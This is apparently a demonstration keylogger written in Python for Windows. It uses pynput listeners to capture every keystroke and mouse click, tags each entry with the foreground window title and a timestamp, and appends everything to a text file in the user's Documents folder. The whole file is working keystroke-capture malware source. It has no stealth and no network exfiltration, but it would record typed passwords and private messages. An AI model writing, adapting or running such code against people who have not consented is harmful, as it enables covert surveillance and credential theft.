import os
import time
from datetime import datetime
from pynput import keyboard, mouse
import win32gui
import threading

# ===== Config =====
username = os.getlogin()
log_file_path = os.path.join("C:/Users", username, "Documents", "keylog_demo.txt")

# ===== Helper =====
def get_active_window_title():
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        return title
    except:
        return "N/A"

# ===== Logger Class =====
class KeyLogger:
    def __init__(self):
        self.last_window = ""
        self.lock = threading.Lock()

    def write_log(self, message):
        with self.lock:
            with open(log_file_path, "a", encoding="utf-8") as f:
                f.write(message)

    def log_window_change(self):
        current_window = get_active_window_title()
        if current_window != self.last_window:
            self.last_window = current_window
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            self.write_log(f"\n\n[{timestamp} | Window: {current_window}]\n")

    def on_key_press(self, key):
        self.log_window_change()
        try:
            if key == keyboard.Key.space:
                self.write_log(" ")
            elif key == keyboard.Key.enter:
                self.write_log("\n")
            elif key == keyboard.Key.tab:
                self.write_log("\n[TAB] ")
            elif key == keyboard.Key.backspace:
                self.write_log("[BACKSPACE]")
            elif hasattr(key, 'char') and key.char is not None:
                self.write_log(key.char)
            else:
                self.write_log(f"[{key.name.upper()}]")
        except Exception as e:
            self.write_log(f"[ERROR: {e}]")

    def on_mouse_click(self, x, y, button, pressed):
        if pressed:
            self.log_window_change()
            self.write_log(f"\n[MOUSE CLICK at ({x}, {y}) - {button.name.upper()}]\n")

    def run(self):
        # Keyboard listener
        key_listener = keyboard.Listener(on_press=self.on_key_press)
        key_listener.start()

        # Mouse listener
        mouse_listener = mouse.Listener(on_click=self.on_mouse_click)
        mouse_listener.start()

        print("[+] Keylogger running... Press Ctrl+C to stop.")
        try:
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("\n[!] Keylogger stopped by user.")
            key_listener.stop()
            mouse_listener.stop()

# ===== Main =====
if __name__ == "__main__":
    print(f"[+] Logging to: {log_file_path}")
    logger = KeyLogger()
    logger.run()
